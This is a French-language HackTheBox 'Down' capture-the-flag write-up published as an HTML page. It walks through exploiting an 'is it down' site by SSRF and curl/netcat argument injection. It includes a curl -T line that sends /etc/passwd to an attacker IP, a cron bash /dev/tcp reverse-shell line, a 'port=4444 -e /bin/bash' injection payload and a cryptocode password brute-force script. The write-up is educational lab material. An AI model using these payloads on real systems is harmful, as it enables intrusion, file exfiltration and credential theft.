@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Down | Writeup</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Down" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Still up" />
+<meta property="og:description" content="Still up" />
+<link rel="canonical" href="/HTB/season8/down.html" />
+<meta property="og:url" content="/HTB/season8/down.html" />
+<meta property="og:site_name" content="Writeup" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-04-02T14:43:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Down" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2026-04-02T14:43:00+02:00","datePublished":"2026-04-02T14:43:00+02:00","description":"Still up","headline":"Down","mainEntityOfPage":{"@type":"WebPage","@id":"/HTB/season8/down.html"},"url":"/HTB/season8/down.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link rel="preload" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700&display=swap" as="style" type="text/css" crossorigin>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#157878">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <a id="skip-to-content" href="#content">Skip to the content.</a>
+
+    <header class="page-header" role="banner">
+      <h1 class="project-name">Down</h1>
+      <h2 class="project-tagline">Still up</h2>
+      
+      
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="foothold">Foothold</h1>
+
+<p>Le nmap nous donne les deux ports classiques</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.93 scan initiated Thu Apr  2 14:32:08 2026 as: nmap -sCV -T4 -p- -v -oN nmap.out down.htb
+Nmap scan report for down.htb (10.129.234.87)
+Host is up (0.033s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 f6cc217ccadaed34fd04efe6f94cddf8 (ECDSA)
+|_  256 fa061ff4bf8ce3b0c840210d5706dd11 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Is it down or just me?
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Apr  2 14:32:44 2026 -- 1 IP address (1 host up) scanned in 35.88 seconds
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{ # a l'air de faire bugger la requête
+{7*7} # changé en 7*7
+ # fait crash la requête
+</code></pre></div></div>
+
+<p>On voit que l’on peut envoyer des requêtes vers les sites webs que l’on veut.</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/down%20images/Pasted%20image%2020260403105642.png"></span></p>
+
+<p>On voit au passage que tous les caractères sont échappés. En testant un peu on voit qu’il est impossible d’échapper au contrôle, on ne pourra pas faire exécuter ce que l’on veut. On tente aussi <code class="language-plaintext highlighter-rouge">file://</code> qui ne fonctionne pas, le site n’accepte que <code class="language-plaintext highlighter-rouge">http</code> et <code class="language-plaintext highlighter-rouge">https</code> en protocole et il vérifie. On va observer la requête reçue à la recherche d’indices: on lance un listener sur notre machine</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 80
+</code></pre></div></div>
+
+<p>Et on lance une connexion depuis le site web.</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/down%20images/Pasted%20image%2020260403105621.png"></span></p>
+
+<p>On voit que le <code class="language-plaintext highlighter-rouge">User-Agent</code> est curl. On sait notamment que curl propose d’autres protocoles comme <code class="language-plaintext highlighter-rouge">file</code> et <code class="language-plaintext highlighter-rouge">gohper</code>. On va creuser la piste de <code class="language-plaintext highlighter-rouge">file://</code> en utilisant des caractères problématiques d’une seclist (<code class="language-plaintext highlighter-rouge">seclists/Fuzzing/special-chars.txt</code>). Il faut bien penser à désactiver l’encodage des chars.</p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/down%20images/Pasted%20image%2020260403114136.png"></span></p>
+
+<p>On lance et on trouve une réponse bien plus longue que les autres: celle avec un <code class="language-plaintext highlighter-rouge">+</code>. Et voilà notre vulnérabilité, on peut lire les fichiers maintenant.</p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/down%20images/Screenshot%20from%202026-04-03%2011-42-26.png"></span></p>
+
+<h2 id="exploration-des-configs">Exploration des configs</h2>
+
+<p>En allant chercher <code class="language-plaintext highlighter-rouge">/proc/self/environ</code> on toruve quelques infos intéressantes.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>APACHE_RUN_DIR=/var/run/apache2 
+SYSTEMD_EXEC_PID=1112
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+JOURNAL_STREAM=8:25307
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+INVOCATION_ID=f52a7e51fe384e33be75f86262e28a25
+APACHE_LOCK_DIR=/var/lock/apache2
+LANG=C APACHE_RUN_USER=www-data
+APACHE_RUN_GROUP=www-data
+APACHE_LOG_DIR=/var/log/apache2
+PWD=/var/www/html
+</code></pre></div></div>
+<p>et dans <code class="language-plaintext highlighter-rouge">/proc/self/cmdline</code> on trouve la commande qui tourne</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/curl -s http:// file:///proc/self/cmdline
+</code></pre></div></div>
+
+<p>Un truc intéressant notamment est l’option, on voit que si l’on utilise <code class="language-plaintext highlighter-rouge">-T</code> on pourrait démarrer un listener localement et s’envoyer des fichiers depuis le serveur, avec par exemple</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.15.35:3333+-T+/etc/passwd
+</code></pre></div></div>
+
+<p>Cela pourrait servir à lire directement un fichier comme <code class="language-plaintext highlighter-rouge">/home/user/.ssh/authorized_keys</code> ou <code class="language-plaintext highlighter-rouge">/home/user/.ssh/id_ed25519</code> et se connecter en ssh. Malheureusement le process tourne en tant que <code class="language-plaintext highlighter-rouge">www-data</code>, on ne peut rien lire.</p>
+
+<p>Dans l’autre sens, avec <code class="language-plaintext highlighter-rouge">-o</code> on peut upload des fichiers, par exemple:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.15.35:3333/file -o /tmp/file
+</code></pre></div></div>
+<p>Ca pourrait nous permettre d’écrire un script comme</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>* * * * * root bash -i &gt;&amp; /dev/tcp/10.10.10.11/9001 0&gt;&amp;1
+
+</code></pre></div></div>
+<p>dans <code class="language-plaintext highlighter-rouge">/etc/cron.d/shell</code> et obtenir un shell ou écrire notre propre clé ssh, mais encore une fois on y a pas accès.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>url=http://10.10.15.35:3333/shell.php+-o+/var/www/html/shell.php
+</code></pre></div></div>
+<p>ne fonctionne bizarrement pas non plus.</p>
+
+<p>En cherchant dans <code class="language-plaintext highlighter-rouge">/etc/apache2/apache2.conf</code> puis <code class="language-plaintext highlighter-rouge">/etc/apache2/envvars</code>, on finit par trouver</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SUFFIX=&amp;quot;-${APACHE_CONFDIR##/etc/apache2-}&amp;quot;
+else
+	SUFFIX=
+fi
+
+# Since there is no sane way to get the parsed apache2 config in scripts, some
+# settings are defined via environment variables and then used in apache2ctl,
+# /etc/init.d/apache2, /etc/logrotate.d/apache2, etc.
+export APACHE_RUN_USER=www-data
+export APACHE_RUN_GROUP=www-data
+# temporary state file location. This might be changed to /run in Wheezy+1
+export APACHE_PID_FILE=/var/run/apache2$SUFFIX/apache2.pid
+export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
+export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX
+# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
+export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
+</code></pre></div></div>
+
+<h2 id="solution">Solution</h2>
+
+<p>En faisant un fetch sur <code class="language-plaintext highlighter-rouge">index.php</code> on lit</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+    &lt;title&gt;Is it down or just me?&lt;/title&gt;
+    &lt;link rel="stylesheet" href="style.css"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;header&gt;
+    &lt;img src="/logo.png" alt="Logo"&gt;
+    &lt;h2&gt;Is it down or just me?&lt;/h2&gt;
+&lt;/header&gt;
+
+&lt;div class="container"&gt;
+
+&lt;?php
+if ( isset($_GET['expertmode']) &amp;&amp; $_GET['expertmode'] === 'tcp' ) {
+  echo '&lt;h1&gt;Is the port refused, or is it just you?&lt;/h1&gt;
+        &lt;form id="urlForm" action="index.php?expertmode=tcp" method="POST"&gt;
+            &lt;input type="text" id="url" name="ip" placeholder="Please enter an IP." required&gt;&lt;br&gt;
+            &lt;input type="number" id="port" name="port" placeholder="Please enter a port number." required&gt;&lt;br&gt;
+            &lt;button type="submit"&gt;Is it refused?&lt;/button&gt;
+        &lt;/form&gt;';
+} else {
+  echo '&lt;h1&gt;Is that website down, or is it just you?&lt;/h1&gt;
+        &lt;form id="urlForm" action="index.php" method="POST"&gt;
+            &lt;input type="url" id="url" name="url" placeholder="Please enter a URL." required&gt;&lt;br&gt;
+            &lt;button type="submit"&gt;Is it down?&lt;/button&gt;
+        &lt;/form&gt;';
+}
+
+if ( isset($_GET['expertmode']) &amp;&amp; $_GET['expertmode'] === 'tcp' &amp;&amp; isset($_POST['ip']) &amp;&amp; isset($_POST['port']) ) {
+  $ip = trim($_POST['ip']);
+  $valid_ip = filter_var($ip, FILTER_VALIDATE_IP);
+  $port = trim($_POST['port']);
+  $port_int = intval($port);
+  $valid_port = filter_var($port_int, FILTER_VALIDATE_INT);
+  if ( $valid_ip &amp;&amp; $valid_port ) {
+    $rc = 255; $output = '';
+    $ec = escapeshellcmd("/usr/bin/nc -vz $ip $port");
+    exec($ec . " 2&gt;&amp;1", $output, $rc);
+    echo '&lt;div class="output" id="outputSection"&gt;';
+    if ( $rc === 0 ) {
+      echo "&lt;font size=+1&gt;It is up. It's just you! 😝&lt;/font&gt;&lt;br&gt;&lt;br&gt;";
+      echo '&lt;p id="outputDetails"&gt;&lt;pre&gt;'.htmlspecialchars(implode("\n",$output)).'&lt;/pre&gt;&lt;/p&gt;';
+    } else {
+      echo "&lt;font size=+1&gt;It is down for everyone! 😔&lt;/font&gt;&lt;br&gt;&lt;br&gt;";
+      echo '&lt;p id="outputDetails"&gt;&lt;pre&gt;'.htmlspecialchars(implode("\n",$output)).'&lt;/pre&gt;&lt;/p&gt;';
+    }
+  } else {
+    echo '&lt;div class="output" id="outputSection"&gt;';
+    echo '&lt;font color=red size=+1&gt;Please specify a correct IP and a port between 1 and 65535.&lt;/font&gt;';
+  }
+} elseif (isset($_POST['url'])) {
+  $url = trim($_POST['url']);
+  if ( preg_match('|^https?://|', $url) ) {
+    $rc = 255; $output = '';
+    $ec = escapeshellcmd("/usr/bin/curl -s $url");
+    exec($ec . " 2&gt;&amp;1", $output, $rc);
+    echo '&lt;div class="output" id="outputSection"&gt;';
+    if ( $rc === 0 ) {
+      echo "&lt;font size=+1&gt;It is up. It's just you! 😝&lt;/font&gt;&lt;br&gt;&lt;br&gt;";
+      echo '&lt;p id="outputDetails"&gt;&lt;pre&gt;'.htmlspecialchars(implode("\n",$output)).'&lt;/pre&gt;&lt;/p&gt;';
+    } else {
+      echo "&lt;font size=+1&gt;It is down for everyone! 😔&lt;/font&gt;&lt;br&gt;&lt;br&gt;";
+    }
+  } else {
+    echo '&lt;div class="output" id="outputSection"&gt;';
+    echo '&lt;font color=red size=+1&gt;Only protocols http or https allowed.&lt;/font&gt;';
+  }
+}
+?&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;footer&gt;© 2024 isitdownorjustme LLC&lt;/footer&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div></div>
+
+<p>On voit notamment le “mode expert” et on voit que l’on peut passer des valeurs. On tente alors de s’envoyer un reverse shell et bingo, on a quelque chose! En fait il fallait voir que le port utilisé est <code class="language-plaintext highlighter-rouge">port</code> mais que tous les filtres sont appliqués à <code class="language-plaintext highlighter-rouge">valid_port</code>, leur sanitization est donc inutile.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ip=10.10.15.35&amp;port=4444+-e+/bin/bash
+</code></pre></div></div>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/down%20images/Pasted%20image%2020260407102943.png"></span></p>
+
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/down%20images/Pasted%20image%2020260407102956.png"></span></p>
+
+<p>On a aussi le flag utilisateur une fois arrivés dessus.</p>
+
+<h1 id="privilege-escalation-to-user">Privilege Escalation to user</h1>
+
+<p>On se balade un peu dans le <code class="language-plaintext highlighter-rouge">/home</code> pour voir ce que l’on peut trouver et on trouve un dossier <code class="language-plaintext highlighter-rouge">/home/aleks/.local/share/pswm/pswm</code>, qui contient</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==
+</code></pre></div></div>
+
+<p>En regardant un peu dans le code de pswm, on remarque que cela correspond à une chaîne de caractère passée par <code class="language-plaintext highlighter-rouge">python's cryptocode.encrypt</code> avec comme master password un mdp entré par l’utilisateur.</p>
+
+<p>On peut donc le déchiffrer avec</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import cryptocode
+print(cryptocode.decrypt("e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==", "&lt;master&gt;"))
+</code></pre></div></div>
+
+<p>Malheureusement, on ne peut pas obtenir le master password, heureusement il y a une fonctionnalité qui fait que si le mot de passe n’est pas le bon, on obtient <code class="language-plaintext highlighter-rouge">False</code> plutôt que de ne juste pas déchiffrer le message, on va donc opter pour le brute force.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import cryptocode
+import argparse
+
+parser = argparse.ArgumentParser()
+parser.add_argument("cipher", help="the cipher, the message you want to brute force")
+parser.add_argument("list", help="list of passwords to try")
+
+
+#Function to verify that the key is valid:
+def encrypt(message, masterPassword):
+    myEncryptedMessage = cryptocode.encrypt(message, masterPassword)
+    return myEncryptedMessage
+
+def decrypt(message, masterPassword):
+    myDecryptedMessage = cryptocode.decrypt(message, masterPassword)
+    return myDecryptedMessage
+
+def brute(cipher, list):
+    with open(list, "r", encoding='latin-1') as p:
+        lines = p.readlines()
+        lineIndex = 0
+        plain = False
+        while (lineIndex &lt; len(lines) and plain == False):
+            line = lines[lineIndex]
+            passwd = line.rstrip()
+            plain = decrypt(cipher, passwd)
+            lineIndex += 1
+        if (lineIndex &lt;= len(lines)):
+            return plain, passwd
+        return None
+
+def main():
+    args = parser.parse_args()
+
+    passwordsFile = args.list
+    print("Password list is: ", args.list)
+    print("Ciphers list is: ", args.cipher)
+    print()
+    print()
+
+    cipherFile = args.cipher
+    with open(cipherFile, "r", encoding='latin-1') as c:
+        lines = c.readlines()
+        for line in lines:
+            cipher = line.rstrip()
+            print("Now trying to decipher: ", cipher)
+            res = brute(cipher, passwordsFile)
+            if res:
+                print("success: ", res)
+
+if __name__ == "__main__":
+    main()
+</code></pre></div></div>
+<p>trouvable aussi dans <a href="https://gist.github.com/TheLastOfEugenes/6349ff3a1117a44c1805fe6a32e7996a" class="web-link">ce</a> gist.</p>
+
+<p>Et avec cet outil, on trouve rapidement notre hash:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>success:  ('pswm\taleks\tflower\naleks@down\taleks\t1uY3w22uc-Wr{xNHR~+E', 'flower')
+</code></pre></div></div>
+
+<p>Et juste comme ça, on a le mdp</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1uY3w22uc-Wr{xNHR~+E
+</code></pre></div></div>
+
+<h1 id="privesc-to-root">PrivEsc to root</h1>
+
+<p>Une fois ça fait on en fait l’accès root, aleks a tous les droits sur la machine. Et voilà</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/down%20images/Pasted%20image%2020260407152226.png"></span></p>
+
+<p>On prend notre flag et la box est finie!</p>
+<p><span class="embed-image-wrapper"><img class="embed-image" src="/assets/HTB/down%20images/Pasted%20image%2020260407152329.png"></span></p>
+
+
+      <footer class="site-footer">
+        
+        <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.</span>
+      </footer>
+    </main>
+  </body>
+</html>
